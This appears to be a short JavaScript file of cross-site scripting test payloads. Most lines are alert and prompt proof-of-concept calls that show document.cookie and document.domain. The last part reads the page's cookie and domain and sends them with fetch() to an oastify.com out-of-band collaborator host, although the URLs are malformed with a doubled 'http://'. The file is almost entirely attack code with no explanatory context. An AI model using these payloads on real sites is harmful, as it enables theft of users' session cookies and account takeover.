alert("1. 009")
alert("2. xss by Prod")
prompt("3. xss through prompt")
alert(document.cookie)
prompt(document.domain)

const cookieValue = document.cookie;
const url = `http://http://ytv34mbs8ktvvm4sqo3bw6oar1xrlg.oastify.com?cookie=${encodeURIComponent(cookieValue)}`;

fetch(url)

const domainValue = document.domain;
const urlDomain = `http://http://ytv34mbs8ktvvm4sqo3bw6oar1xrlg.oastify.com?cookie=${encodeURIComponent(domainValue)}`;

fetch(urlDomain)
